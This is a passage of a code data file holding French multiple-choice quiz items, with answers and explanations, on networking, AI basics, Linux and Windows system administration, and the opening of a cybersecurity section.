    explanation: "L'enregistrement A pointe vers une adresse IPv4. AAAA fait l'équivalent pour IPv6.",
  },
  {
    key: "dns-record-mx",
    category: "NETWORKING",
    prompt: "Quel type d'enregistrement DNS indique le serveur de messagerie d'un domaine ?",
    choices: ["A", "MX", "NS", "AAAA"],
    correctIndex: 1,
    explanation: "MX (Mail Exchange) indique à quel(s) serveur(s) envoyer les emails destinés à ce domaine.",
  },
  {
    key: "nat-role",
    category: "NETWORKING",
    prompt: "À quoi sert le NAT (Network Address Translation) ?",
    choices: ["Chiffrer le trafic", "Permettre à plusieurs appareils d'un réseau privé de partager une seule adresse IP publique", "Accélérer le DNS", "Bloquer les intrusions"],
    correctIndex: 1,
    explanation: "Ton routeur domestique fait du NAT : tous tes appareils partagent l'unique IP publique fournie par ton FAI.",
  },
  {
    key: "http-vs-https",
    category: "NETWORKING",
    prompt: "Quelle est la différence fondamentale entre HTTP et HTTPS ?",
    choices: ["HTTPS est juste plus rapide", "HTTPS chiffre la communication via TLS, pas HTTP", "Ce sont deux protocoles totalement indépendants", "HTTP ne fonctionne que sur mobile"],
    correctIndex: 1,
    explanation: "HTTPS = HTTP + une couche de chiffrement TLS, protégeant confidentialité et intégrité des données échangées.",
  },
  {
    key: "router-vs-switch",
    category: "NETWORKING",
    prompt: "Quelle est la différence principale entre un routeur et un switch ?",
    choices: ["Aucune différence", "Un routeur relie des réseaux différents, un switch relie des appareils au sein d'un même réseau", "Un switch est toujours sans fil", "Un routeur ne fonctionne qu'en entreprise"],
    correctIndex: 1,
    explanation: "Le switch travaille au sein d'un même réseau local (couche 2), le routeur fait transiter le trafic entre réseaux différents (couche 3).",
  },
  {
    key: "ping-tool-purpose",
    category: "NETWORKING",
    prompt: "À quoi sert la commande `ping` ?",
    choices: ["Installer un paquet", "Vérifier qu'un hôte est joignable sur le réseau et mesurer la latence", "Chiffrer une connexion", "Lister les ports ouverts"],
    correctIndex: 1,
    explanation: "`ping` envoie des paquets ICMP et mesure le temps de réponse — un outil de diagnostic réseau de base.",
  },
  {
    key: "traceroute-purpose",
    category: "NETWORKING",
    prompt: "À quoi sert la commande `traceroute` (ou `tracert` sous Windows) ?",
    choices: ["Afficher le chemin (les sauts réseau) emprunté par les paquets jusqu'à une destination", "Réparer une connexion cassée", "Chiffrer le trafic", "Scanner les ports ouverts"],
    correctIndex: 0,
    explanation: "Utile pour diagnostiquer où exactement le trafic ralentit ou se perd entre toi et une destination donnée.",
  },
  {
    key: "ipv4-vs-ipv6",
    category: "NETWORKING",
    prompt: "Pourquoi IPv6 a-t-il été créé en complément d'IPv4 ?",
    choices: ["Pour être plus lent mais plus sûr", "Pour offrir un espace d'adressage bien plus grand, IPv4 étant en pénurie d'adresses", "Pour remplacer complètement HTTP", "Pour supprimer le besoin de DNS"],
    correctIndex: 1,
    explanation: "IPv4 (32 bits, ~4 milliards d'adresses) est épuisé face à la croissance d'internet ; IPv6 (128 bits) offre un espace d'adressage colossal.",
  },
  {
    key: "proxy-server-role",
    category: "NETWORKING",
    prompt: "À quoi sert un serveur proxy ?",
    choices: ["Il sert d'intermédiaire entre un client et un serveur, pouvant filtrer, cacher ou anonymiser les requêtes", "Il stocke uniquement des sauvegardes", "Il chiffre les mots de passe en base", "Il n'existe qu'en cybersécurité offensive"],
    correctIndex: 0,
    explanation: "Un proxy peut mettre en cache des ressources, filtrer du contenu, ou masquer l'IP d'origine du client selon sa configuration.",
  },
  {
    key: "bandwidth-vs-latency",
    category: "NETWORKING",
    prompt: "Quelle est la différence entre bande passante et latence ?",
    choices: ["Ce sont des synonymes", "La bande passante mesure le volume de données transmissibles par seconde, la latence mesure le délai avant qu'une donnée arrive", "La latence ne concerne que le Wi-Fi", "La bande passante ne concerne que la fibre"],
    correctIndex: 1,
    explanation: "Une connexion peut avoir une bande passante énorme mais une latence élevée (satellite), ou l'inverse — deux mesures indépendantes.",
  },
  {
    key: "firewall-network-role",
    category: "NETWORKING",
    prompt: "Quel est le rôle principal d'un pare-feu (firewall) réseau ?",
    choices: ["Accélérer le trafic", "Filtrer le trafic entrant/sortant selon des règles définies", "Stocker des fichiers", "Traduire les noms de domaine"],
    correctIndex: 1,
    explanation: "Un pare-feu bloque ou autorise le trafic selon des règles (ports, adresses IP, protocoles...) définies à l'avance.",
  },
  {
    key: "http-methods-idempotent",
    category: "NETWORKING",
    prompt: "Parmi ces verbes HTTP, lequel n'est PAS censé être idempotent ?",
    choices: ["GET", "PUT", "DELETE", "POST"],
    correctIndex: 3,
    explanation: "GET, PUT et DELETE sont censés produire le même résultat si répétés ; POST, lui, peut créer une nouvelle ressource à chaque appel.",
  },
  {
    key: "websocket-vs-polling",
    category: "NETWORKING",
    prompt: "Pourquoi préférer un WebSocket au polling HTTP répété pour du temps réel ?",
    choices: ["Le WebSocket est toujours plus sécurisé par nature", "Le WebSocket maintient une connexion ouverte, évitant de multiplier les requêtes HTTP inutiles", "Le polling ne fonctionne pas sur mobile", "Il n'y a aucune différence pratique"],
    correctIndex: 1,
    explanation: "Le polling force le client à interroger le serveur en boucle même si rien de neuf ; le WebSocket laisse le serveur pousser l'info dès qu'elle existe.",
  },
  {
    key: "vlan-purpose",
    category: "NETWORKING",
    prompt: "À quoi sert un VLAN (Virtual LAN) ?",
    choices: ["Segmenter logiquement un réseau physique en plusieurs réseaux séparés", "Augmenter la vitesse du Wi-Fi", "Remplacer le DNS", "Chiffrer automatiquement tout le trafic"],
    correctIndex: 0,
    explanation: "Un VLAN isole logiquement des groupes d'appareils sur un même switch physique, sans câblage séparé pour chaque réseau.",
  },
  {
    key: "http-header-purpose",
    category: "NETWORKING",
    prompt: "À quoi servent les en-têtes HTTP (headers) ?",
    choices: ["Ils ne servent à rien, c'est de la métadonnée facultative ignorée par les serveurs", "Transmettre des métadonnées sur la requête/réponse (type de contenu, authentification, cache...)", "Contenir uniquement le corps de la réponse", "Chiffrer automatiquement la requête"],
    correctIndex: 1,
    explanation: "Ex: `Content-Type`, `Authorization`, `Cache-Control` — des informations sur la requête/réponse, séparées du corps du message.",
  },
  {
    key: "icmp-protocol",
    category: "NETWORKING",
    prompt: "Quel protocole est utilisé par la commande `ping` pour vérifier la joignabilité d'un hôte ?",
    choices: ["TCP", "UDP", "ICMP", "HTTP"],
    correctIndex: 2,
    explanation: "ICMP (Internet Control Message Protocol) est dédié aux messages de diagnostic réseau, comme les requêtes/réponses ping.",
  },

  // AI
  {
    key: "ai-vs-ml-relation",
    category: "AI",
    prompt: "Quelle est la relation entre Intelligence Artificielle (IA) et Machine Learning (ML) ?",
    choices: ["Ce sont des synonymes", "Le Machine Learning est un sous-domaine de l'IA", "L'IA est un sous-domaine du Machine Learning", "Aucun rapport entre les deux"],
    correctIndex: 1,
    explanation: "L'IA est le domaine large (imiter des capacités \"intelligentes\") ; le ML en est une approche spécifique, où le système apprend à partir de données plutôt que d'être programmé explicitement.",
  },
  {
    key: "supervised-learning-def",
    category: "AI",
    prompt: "Qu'est-ce que l'apprentissage supervisé en Machine Learning ?",
    choices: ["Le modèle apprend à partir de données étiquetées (la bonne réponse est connue à l'avance)", "Le modèle n'utilise aucune donnée", "Le modèle apprend totalement sans données ni supervision", "Un synonyme strict de deep learning"],
    correctIndex: 0,
    explanation: "Ex: entraîner un modèle à reconnaître des chats en lui montrant des milliers d'images déjà étiquetées \"chat\"/\"pas chat\".",
  },
  {
    key: "neural-network-basic",
    category: "AI",
    prompt: "Qu'est-ce qu'un réseau de neurones artificiel, en très résumé ?",
    choices: ["Un simple tableau de données", "Un modèle inspiré du cerveau, composé de couches de nœuds interconnectés qui ajustent des poids pendant l'entraînement", "Un langage de programmation dédié à l'IA", "Une base de données spécialisée"],
    correctIndex: 1,
    explanation: "Chaque connexion a un \"poids\" ajusté pendant l'entraînement pour que le réseau produise de meilleures prédictions au fil du temps.",
  },
  {
    key: "overfitting-def",
    category: "AI",
    prompt: "Qu'est-ce que l'overfitting (surapprentissage) en Machine Learning ?",
    choices: ["Le modèle est trop simple pour capturer les tendances des données", "Le modèle apprend trop bien les données d'entraînement (y compris leur bruit) et généralise mal sur de nouvelles données", "Le modèle s'entraîne anormalement vite", "Un synonyme de fine-tuning"],
    correctIndex: 1,
    explanation: "Un modèle en overfitting excelle sur les données déjà vues mais échoue sur des données nouvelles — il a \"appris par cœur\" plutôt que compris les tendances générales.",
  },
  {
    key: "training-data-def",
    category: "AI",
    prompt: "Que sont les 'données d'entraînement' (training data) d'un modèle ?",
    choices: ["Les données utilisées uniquement pour tester le modèle après coup", "Les données utilisées pour ajuster les paramètres du modèle pendant son apprentissage", "Les données générées par le modèle une fois déployé", "Un synonyme de prompt utilisateur"],
    correctIndex: 1,
    explanation: "On distingue souvent training set (entraînement), validation set (ajustement) et test set (évaluation finale, jamais vu pendant l'entraînement).",
  },
  {
    key: "chatbot-hallucination",
    category: "AI",
    prompt: "Un chatbot basé sur un LLM répond-il toujours avec des informations vérifiées ?",
    choices: ["Oui, toujours, un LLM ne peut techniquement pas se tromper", "Non, il peut halluciner (inventer des faits avec assurance) — il faut vérifier les infos critiques", "Seulement si un mode spécial est activé", "Seulement en anglais"],
    correctIndex: 1,
    explanation: "Un LLM génère le texte statistiquement probable, pas une réponse vérifiée contre une base de faits — d'où l'importance de vérifier toute information critique.",
  },
  {
    key: "context-window-def",
    category: "AI",
    prompt: "Qu'est-ce que la 'fenêtre de contexte' (context window) d'un LLM ?",
    choices: ["Une fenêtre d'interface graphique", "La quantité maximale de texte (en tokens) que le modèle peut prendre en compte à la fois", "Le temps de réponse du modèle", "Un synonyme de fine-tuning"],
    correctIndex: 1,
    explanation: "Au-delà de cette limite, le début de la conversation \"sort\" du contexte que le modèle peut effectivement prendre en compte.",
  },
  {
    key: "embedding-def",
    category: "AI",
    prompt: "Qu'est-ce qu'un embedding en IA ?",
    choices: ["Un mot de passe chiffré", "Une représentation numérique (vecteur) d'un texte/image capturant son sens, utilisée pour mesurer la similarité entre contenus", "Un type de réseau social", "Un format d'image compressée"],
    correctIndex: 1,
    explanation: "Deux textes au sens proche auront des embeddings mathématiquement proches — la base technique du RAG et de la recherche sémantique.",
  },
  {
    key: "computer-vision-def",
    category: "AI",
    prompt: "Que désigne le terme 'Computer Vision' en IA ?",
    choices: ["La capacité d'une IA à générer du texte", "Le domaine de l'IA qui permet à une machine d'analyser et comprendre des images/vidéos", "Un langage de programmation dédié à l'IA", "Un synonyme exact de NLP"],
    correctIndex: 1,
    explanation: "Reconnaissance faciale, détection d'objets, lecture de plaques d'immatriculation... sont des applications de Computer Vision.",
  },
  {
    key: "nlp-acronym-def",
    category: "AI",
    prompt: "Que signifie l'acronyme NLP en IA ?",
    choices: ["Network Language Protocol", "Natural Language Processing", "New Learning Pattern", "Neural Logic Programming"],
    correctIndex: 1,
    explanation: "Le Traitement du Langage Naturel (NLP) regroupe les techniques permettant à une machine de comprendre/générer du langage humain.",
  },
  {
    key: "reinforcement-learning-def",
    category: "AI",
    prompt: "En quoi consiste l'apprentissage par renforcement (reinforcement learning) ?",
    choices: ["Le modèle apprend en recevant des récompenses/pénalités selon ses actions dans un environnement", "Le modèle copie exactement des exemples fournis", "Un synonyme d'apprentissage supervisé", "Une technique de compression d'image"],
    correctIndex: 0,
    explanation: "Utilisé par exemple pour entraîner des IA à jouer à des jeux : elles reçoivent une récompense en cas de succès, une pénalité sinon, et ajustent leur stratégie.",
  },
  {
    key: "generative-ai-def",
    category: "AI",
    prompt: "Que signifie 'IA générative' ?",
    choices: ["Une IA qui ne fait que classer des données existantes", "Une IA capable de créer du contenu nouveau (texte, image, code...) plutôt que seulement l'analyser", "Un synonyme de base de données", "Une IA qui fonctionne sans électricité"],
    correctIndex: 1,
    explanation: "Les LLM (génération de texte), les modèles de diffusion (génération d'images) sont des exemples d'IA générative.",
  },
  {
    key: "bias-in-ai-source",
    category: "AI",
    prompt: "D'où vient principalement le biais d'un modèle d'IA ?",
    choices: ["D'un bug dans le code du modèle uniquement", "Souvent des données d'entraînement elles-mêmes, qui reflètent des biais existants dans le monde réel", "Toujours d'une malveillance délibérée du créateur", "Il n'existe pas réellement de biais en IA"],
    correctIndex: 1,
    explanation: "Un modèle entraîné sur des données historiquement biaisées (ex: recrutement) reproduira et peut même amplifier ces biais dans ses prédictions.",
  },
  {
    key: "gpu-for-ai-reason",
    category: "AI",
    prompt: "Pourquoi les GPU sont-ils privilégiés pour entraîner des modèles d'IA plutôt que les CPU ?",
    choices: ["Ils sont moins chers à l'achat", "Ils excellent dans les calculs parallèles massifs (multiplications de matrices utilisées en deep learning)", "Ils consomment moins d'électricité", "Ils sont plus simples à programmer"],
    correctIndex: 1,
    explanation: "L'entraînement d'un réseau de neurones repose massivement sur des opérations matricielles parallélisables, exactement ce pour quoi les GPU ont été conçus (à l'origine pour le rendu graphique).",
  },
  {
    key: "ai-api-key-purpose",
    category: "AI",
    prompt: "Pourquoi une clé API est-elle nécessaire pour utiliser un service d'IA comme Claude ou GPT via une application ?",
    choices: ["Ce n'est jamais réellement nécessaire", "Pour authentifier les requêtes et permettre au fournisseur de facturer l'usage", "Pour ralentir volontairement les requêtes", "Pour chiffrer uniquement le message envoyé"],
    correctIndex: 1,
    explanation: "La clé identifie qui fait la requête, permettant la facturation à l'usage et l'application de limites/quotas par compte.",
  },
  {
    key: "temperature-param-def",
    category: "AI",
    prompt: "En IA générative, à quoi sert le paramètre 'température' d'un modèle ?",
    choices: ["Mesurer la charge du serveur qui héberge le modèle", "Contrôler le degré d'aléatoire/créativité des réponses générées", "Chiffrer la réponse générée", "Limiter le nombre de tokens en sortie"],
    correctIndex: 1,
    explanation: "Une température basse rend les réponses plus déterministes/prévisibles ; une température élevée les rend plus variées/créatives (au risque d'être moins cohérentes).",
  },
  {
    key: "system-prompt-def",
    category: "AI",
    prompt: "Qu'est-ce qu'un 'system prompt' pour un assistant IA ?",
    choices: ["Le message tapé directement par l'utilisateur", "Des instructions de comportement données au modèle en amont, généralement invisibles pour l'utilisateur final", "Un message d'erreur technique", "Un synonyme de fine-tuning"],
    correctIndex: 1,
    explanation: "Le system prompt cadre le comportement général de l'assistant (ton, règles, rôle) avant même que l'utilisateur ne pose sa question.",
  },
  {
    key: "ai-agent-def",
    category: "AI",
    prompt: "Que désigne un 'agent IA' par rapport à un simple chatbot ?",
    choices: ["Un synonyme exact de chatbot", "Un système qui peut utiliser des outils/actions de façon autonome pour accomplir une tâche, pas juste répondre à des messages", "Un modèle systématiquement plus petit", "Un modèle qui ne fonctionne que hors ligne"],
    correctIndex: 1,
    explanation: "Un agent peut par exemple chercher sur le web, exécuter du code, ou appeler des APIs de façon autonome pour accomplir une tâche complexe en plusieurs étapes.",
  },
  {
    key: "deep-learning-def",
    category: "AI",
    prompt: "Qu'est-ce que le deep learning (apprentissage profond) ?",
    choices: ["Un synonyme strict d'apprentissage supervisé", "Une famille de Machine Learning utilisant des réseaux de neurones à de nombreuses couches", "Un algorithme de tri de données", "Un type de base de données spécialisée"],
    correctIndex: 1,
    explanation: "\"Profond\" fait référence au nombre de couches du réseau de neurones — plus il y en a, plus le modèle peut apprendre des représentations complexes.",
  },
  {
    key: "dataset-quality-importance",
    category: "AI",
    prompt: "Pourquoi la qualité des données d'entraînement est-elle si critique en Machine Learning ?",
    choices: ["Elle ne l'est pas vraiment, seule la quantité compte", "Un modèle entraîné sur des données biaisées ou erronées reproduira ces défauts dans ses prédictions", "Les données ne sont utilisées qu'au moment du déploiement", "La qualité n'affecte que la vitesse d'entraînement"],
    correctIndex: 1,
    explanation: "\"Garbage in, garbage out\" : un modèle ne peut pas être meilleur que les données sur lesquelles il a appris.",
  },
  {
    key: "multimodal-ai-def",
    category: "AI",
    prompt: "Que signifie un modèle d'IA 'multimodal' ?",
    choices: ["Il ne fonctionne que sur mobile", "Il peut traiter plusieurs types de données (texte, image, audio...) plutôt qu'un seul", "Il tourne simultanément sur plusieurs serveurs", "Il possède plusieurs noms commerciaux"],
    correctIndex: 1,
    explanation: "Un modèle multimodal peut par exemple analyser une image ET répondre en texte à son sujet, dans une même conversation.",
  },
  {
    key: "ai-benchmark-def",
    category: "AI",
    prompt: "À quoi sert un benchmark en IA (jeu de test standardisé) ?",
    choices: ["À entraîner le modèle directement dessus en production", "À comparer objectivement les performances de différents modèles sur les mêmes tâches", "À chiffrer les résultats obtenus", "À remplacer complètement les tests unitaires classiques"],
    correctIndex: 1,
    explanation: "Un benchmark fournit une base de comparaison commune — attention cependant à ne pas entraîner un modèle directement sur les données du benchmark, ce qui fausserait la comparaison.",
  },
  {
    key: "ai-inference-def",
    category: "AI",
    prompt: "Que désigne l''inférence' pour un modèle d'IA déjà entraîné ?",
    choices: ["La phase où on entraîne encore le modèle sur de nouvelles données", "La phase où le modèle déjà entraîné génère une prédiction/réponse à partir d'une nouvelle entrée", "Un synonyme strict de fine-tuning", "Un type de biais spécifique"],
    correctIndex: 1,
    explanation: "Quand tu poses une question à un chatbot, c'est de l'inférence : le modèle n'apprend rien de nouveau, il applique ce qu'il a déjà appris.",
  },
  {
    key: "open-vs-closed-model",
    category: "AI",
    prompt: "Quelle est la différence entre un modèle d'IA 'open-weight' et un modèle propriétaire fermé ?",
    choices: ["Aucune différence réelle", "Les poids d'un modèle open-weight sont publiquement téléchargeables et exécutables localement, contrairement à un modèle fermé accessible seulement via une API", "Un modèle open-weight est toujours moins performant", "Un modèle fermé ne peut jamais être payant"],
    correctIndex: 1,
    explanation: "Un modèle open-weight (ex: certains modèles Llama) peut être téléchargé et exécuté sur ses propres serveurs, offrant plus de contrôle mais demandant sa propre infrastructure.",
  },
  {
    key: "ai-token-cost",
    category: "AI",
    prompt: "Comment la plupart des APIs de LLM facturent-elles l'usage ?",
    choices: ["Un forfait fixe mensuel unique, quel que soit l'usage", "Au nombre de tokens traités (en entrée et/ou en sortie)", "Au nombre de comptes utilisateurs uniquement", "L'usage des APIs de LLM est toujours entièrement gratuit"],
    correctIndex: 1,
    explanation: "Plus le prompt et la réponse générée sont longs (en tokens), plus la requête coûte cher — d'où l'intérêt de prompts concis et bien ciblés.",
  },

  // SYSTEMS
  {
    key: "linux-chmod",
    category: "SYSTEMS",
    prompt: "Sous Linux, quelle commande change les permissions d'un fichier ?",
    choices: ["chown", "chmod", "ls -l", "sudo"],
    correctIndex: 1,
    explanation: "`chmod 755 fichier` par exemple change qui peut lire/écrire/exécuter ce fichier. `chown` change le propriétaire, pas les permissions.",
  },
  {
    key: "linux-chown",
    category: "SYSTEMS",
    prompt: "À quoi sert la commande `chown` sous Linux ?",
    choices: ["Changer les permissions d'un fichier", "Changer le propriétaire (et/ou le groupe) d'un fichier", "Compresser un fichier", "Afficher le contenu d'un fichier"],
    correctIndex: 1,
    explanation: "`chown alice fichier.txt` transfère la propriété du fichier à l'utilisateur `alice`.",
  },
  {
    key: "linux-grep-purpose",
    category: "SYSTEMS",
    prompt: "À quoi sert la commande `grep` sous Linux ?",
    choices: ["Copier des fichiers", "Rechercher du texte correspondant à un motif dans un fichier ou un flux", "Supprimer des fichiers", "Changer de répertoire courant"],
    correctIndex: 1,
    explanation: "`grep \"erreur\" logs.txt` affiche toutes les lignes du fichier contenant le mot \"erreur\" — souvent combiné avec des expressions régulières.",
  },
  {
    key: "linux-root-user",
    category: "SYSTEMS",
    prompt: "Qui est l'utilisateur `root` sous Linux ?",
    choices: ["Un utilisateur normal comme les autres", "Le super-utilisateur ayant tous les droits sur le système", "Un compte toujours désactivé par défaut", "Un synonyme d'\"admin\" existant uniquement sous Windows"],
    correctIndex: 1,
    explanation: "`root` peut lire, écrire et exécuter absolument tout sur le système — d'où la prudence à observer avant de l'utiliser directement (préférer `sudo` ponctuellement).",
  },
  {
    key: "os-kernel-def",
    category: "SYSTEMS",
    prompt: "Qu'est-ce que le noyau (kernel) d'un système d'exploitation ?",
    choices: ["L'interface graphique du système", "Le cœur du système qui gère directement le matériel (CPU, mémoire, périphériques) pour les autres programmes", "Un antivirus intégré au système", "Un navigateur web installé par défaut"],
    correctIndex: 1,
    explanation: "Linux, le noyau Windows NT, le noyau XNU (macOS) sont des exemples de noyaux — la couche la plus basse entre le matériel et les applications.",
  },
  {
    key: "windows-task-manager-shortcut",
    category: "SYSTEMS",
    prompt: "Sous Windows, quel raccourci ouvre le Gestionnaire des tâches ?",
    choices: ["Ctrl+Shift+Échap", "Alt+F4", "Ctrl+C", "Windows+L"],
    correctIndex: 0,
    explanation: "Ctrl+Shift+Échap ouvre directement le Gestionnaire des tâches, sans passer par l'écran de verrouillage (contrairement à Ctrl+Alt+Suppr).",
  },
  {
    key: "linux-apt-install",
    category: "SYSTEMS",
    prompt: "Sous Ubuntu/Debian, quelle commande installe un paquet système ?",
    choices: ["yum install", "apt install", "brew install", "pacman -S"],
    correctIndex: 1,
    explanation: "`apt` est le gestionnaire de paquets des distributions basées sur Debian (Ubuntu inclus). `yum`/`dnf` pour Red Hat/Fedora, `brew` pour macOS, `pacman` pour Arch Linux.",
  },
  {
    key: "cron-job-purpose",
    category: "SYSTEMS",
    prompt: "À quoi sert une tâche cron (crontab) sous Linux ?",
    choices: ["Chiffrer des fichiers automatiquement", "Exécuter automatiquement une commande selon un planning récurrent (ex: tous les jours à minuit)", "Gérer les permissions utilisateurs", "Compresser des fichiers de logs"],
    correctIndex: 1,
    explanation: "Utile pour des sauvegardes automatiques, des nettoyages périodiques, ou tout script à lancer régulièrement sans intervention manuelle.",
  },
  {
    key: "filesystem-permission-r",
    category: "SYSTEMS",
    prompt: "Sous Linux, que signifie la permission `r` sur un fichier ?",
    choices: ["Exécution (run)", "Lecture (read)", "Écriture (write)", "Suppression (remove)"],
    correctIndex: 1,
    explanation: "`rwx` = read (lecture), write (écriture), execute (exécution) — les trois permissions de base, définies séparément pour le propriétaire, le groupe et les autres.",
  },
  {
    key: "ram-vs-disk-storage",
    category: "SYSTEMS",
    prompt: "Quelle est la différence fondamentale entre la RAM et le stockage disque (SSD/HDD) ?",
    choices: ["Aucune différence notable", "La RAM est volatile (perd son contenu à l'extinction) et rapide, le disque est persistant et plus lent", "Le disque est toujours plus rapide que la RAM", "La RAM stocke les fichiers de façon permanente comme le disque"],
    correctIndex: 1,
    explanation: "C'est pour ça qu'un logiciel ouvert (en RAM) disparaît si tu coupes le courant sans sauvegarder sur le disque, qui lui conserve les données même hors tension.",
  },
  {
    key: "process-pid-def",
    category: "SYSTEMS",
    prompt: "Qu'est-ce qu'un PID sous Linux/Unix ?",
    choices: ["Un mot de passe système", "L'identifiant unique attribué à chaque processus en cours d'exécution", "Un type de fichier spécial", "Un protocole réseau"],
    correctIndex: 1,
    explanation: "`kill 1234` par exemple arrête le processus dont le PID est 1234 — utile pour cibler précisément un programme qui ne répond plus.",
  },
  {
    key: "linux-sudo-purpose",
    category: "SYSTEMS",
    prompt: "À quoi sert la commande `sudo` sous Linux ?",
    choices: ["Supprimer un utilisateur du système", "Exécuter une commande avec les privilèges d'un autre utilisateur (souvent root)", "Redémarrer le système immédiatement", "Afficher l'espace disque disponible"],
    correctIndex: 1,
    explanation: "\"superuser do\" — permet d'élever temporairement ses privilèges pour UNE commande précise, plutôt que de rester connecté en root en permanence.",
  },
  {
    key: "bios-uefi-role",
    category: "SYSTEMS",
    prompt: "Quel est le rôle du BIOS/UEFI au démarrage d'un ordinateur ?",
    choices: ["Afficher directement le bureau Windows", "Initialiser le matériel et démarrer le système d'exploitation", "Se connecter automatiquement à internet", "Scanner les virus présents"],
    correctIndex: 1,
    explanation: "Le BIOS/UEFI est le tout premier logiciel exécuté au démarrage, avant même que le système d'exploitation ne prenne le relais.",
  },
  {
    key: "filesystem-ntfs",
    category: "SYSTEMS",
    prompt: "Lequel de ces éléments est un système de fichiers (filesystem) ?",
    choices: ["HTTP", "NTFS", "TCP", "DNS"],
    correctIndex: 1,
    explanation: "NTFS est le système de fichiers par défaut de Windows. HTTP, TCP et DNS sont des protocoles réseau, pas des systèmes de fichiers.",
  },
  {
    key: "ssh-remote-purpose",
    category: "SYSTEMS",
    prompt: "À quoi sert SSH principalement ?",
    choices: ["Transférer uniquement de gros fichiers", "Se connecter et administrer une machine distante de façon sécurisée et chiffrée", "Naviguer sur le web", "Envoyer des emails"],
    correctIndex: 1,
    explanation: "SSH (Secure Shell) chiffre toute la session, contrairement à Telnet (obsolète) qui transmettait tout en clair.",
  },
  {
    key: "windows-vs-linux-licensing",
    category: "SYSTEMS",
    prompt: "Quelle est une différence notable entre Windows et la plupart des distributions Linux ?",
    choices: ["Windows est gratuit, Linux est payant", "Beaucoup de distributions Linux sont open-source et gratuites, Windows est un logiciel propriétaire payant", "Linux ne fonctionne que sur serveur", "Windows n'a pas d'interface graphique"],
    correctIndex: 1,
    explanation: "Le code source de Linux est public et librement modifiable ; Windows est développé et licencié par Microsoft de façon fermée.",
  },
  {
    key: "env-path-variable",
    category: "SYSTEMS",
    prompt: "À quoi sert la variable d'environnement `PATH` ?",
    choices: ["Stocker le mot de passe administrateur", "Lister les répertoires où le système cherche les exécutables quand on tape une commande", "Définir la langue du système", "Stocker l'adresse IP de la machine"],
    correctIndex: 1,
    explanation: "Si `node` n'est pas trouvé alors qu'il est installé, c'est souvent que son dossier n'est pas dans le `PATH`.",
  },
  {
    key: "swap-memory-purpose",
    category: "SYSTEMS",
    prompt: "À quoi sert la mémoire swap (fichier d'échange) ?",
    choices: ["Accélérer le CPU", "Servir d'extension de la RAM sur le disque quand la mémoire physique est saturée (bien plus lent que la RAM)", "Stocker les mots de passe", "Chiffrer les fichiers du système"],
    correctIndex: 1,
    explanation: "Le swap évite un crash immédiat par manque de mémoire, au prix d'un ralentissement important dès qu'il est sollicité massivement.",
  },
  {
    key: "linux-ls-command",
    category: "SYSTEMS",
    prompt: "Sous Linux, quelle commande liste le contenu d'un répertoire ?",
    choices: ["dir", "ls", "list", "show"],
    correctIndex: 1,
    explanation: "`ls -la` par exemple liste tous les fichiers (y compris cachés) avec leurs détails. `dir` est la commande équivalente sous Windows.",
  },
  {
    key: "background-process-def",
    category: "SYSTEMS",
    prompt: "Que signifie exécuter un processus 'en arrière-plan' (background) sous Linux ?",
    choices: ["Le processus s'exécute sans bloquer le terminal, qui reste utilisable pour d'autres commandes", "Le processus est mis en pause indéfiniment", "Le processus est automatiquement supprimé", "Le processus tourne plus vite qu'en avant-plan"],
    correctIndex: 0,
    explanation: "Ajouter `&` à la fin d'une commande (`mon_script.sh &`) la lance en arrière-plan, libérant immédiatement le terminal.",
  },
  {
    key: "linux-man-pages",
    category: "SYSTEMS",
    prompt: "À quoi servent les 'man pages' sous Linux (ex: `man ls`) ?",
    choices: ["Afficher la version du noyau installé", "Afficher le manuel/documentation officielle d'une commande", "Lister les utilisateurs connectés", "Redémarrer un service système"],
    correctIndex: 1,
    explanation: "Chaque commande standard possède sa page de manuel intégrée, consultable directement depuis le terminal sans accès internet.",
  },
  {
    key: "system-uptime-command",
    category: "SYSTEMS",
    prompt: "Que mesure la commande `uptime` sous Linux ?",
    choices: ["L'espace disque libre restant", "Depuis combien de temps le système tourne sans redémarrage, et sa charge moyenne", "La vitesse du processeur en temps réel", "Le nombre d'utilisateurs connectés uniquement"],
    correctIndex: 1,
    explanation: "Utile pour vérifier la stabilité d'un serveur (un uptime très court après un plantage inattendu est un signal d'alerte).",
  },
  {
    key: "windows-registry-def",
    category: "SYSTEMS",
    prompt: "Qu'est-ce que le Registre Windows (Registry) ?",
    choices: ["Un logiciel antivirus", "Une base de données hiérarchique stockant la configuration du système et des applications", "Un gestionnaire de fichiers", "Un pare-feu intégré"],
    correctIndex: 1,
    explanation: "Modifier le Registre à la main est risqué : une erreur peut rendre Windows instable, d'où la prudence recommandée avant toute modification manuelle.",
  },
  {
    key: "linux-symlink-def",
    category: "SYSTEMS",
    prompt: "Qu'est-ce qu'un lien symbolique (symlink) sous Linux ?",
    choices: ["Une copie complète et indépendante d'un fichier", "Un raccourci pointant vers un autre fichier ou dossier, sans dupliquer son contenu", "Un fichier automatiquement chiffré", "Un type particulier de permission"],
    correctIndex: 1,
    explanation: "Créé avec `ln -s cible lien` — si le fichier cible est supprimé ou déplacé, le lien symbolique devient \"cassé\" (pointe vers rien).",
  },
  {
    key: "linux-df-command",
    category: "SYSTEMS",
    prompt: "Sous Linux, quelle commande affiche l'espace disque utilisé/disponible ?",
    choices: ["df -h", "ls -la", "top", "ping"],
    correctIndex: 0,
    explanation: "`df -h` (disk free, human-readable) affiche l'espace disque par système de fichiers monté, dans un format lisible (Go, Mo...).",
  },

  // CYBERSECURITY
  {
    key: "social-engineering-def",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que l'ingénierie sociale (social engineering) en cybersécurité ?",
    choices: ["Exploiter une faille technique dans un logiciel", "Manipuler psychologiquement une personne pour lui faire réaliser une action ou révéler une information", "Un type de pare-feu spécifique", "Un algorithme de chiffrement"],
    correctIndex: 1,
    explanation: "Le phishing est une forme d'ingénierie sociale — la faille exploitée est humaine, pas technique.",
  },
  {
    key: "password-hash-irreversible",
    category: "CYBERSECURITY",
    prompt: "Pourquoi ne peut-on pas 'déchiffrer' un mot de passe correctement haché pour le retrouver en clair ?",
    choices: ["C'est possible mais interdit par la loi", "Le hashing est une fonction à sens unique, mathématiquement impossible à inverser directement", "Les mots de passe ne sont en réalité jamais hachés en pratique", "Le hachage double simplement la taille du mot de passe"],
    correctIndex: 1,
    explanation: "On peut seulement vérifier qu'un mot de passe donné produit le même hash — jamais retrouver l'original à partir du hash seul (hors attaque par force brute/dictionnaire).",
  },
  {
    key: "least-privilege-principle",
    category: "CYBERSECURITY",
    prompt: "Qu'est-ce que le principe du moindre privilège (least privilege) ?",
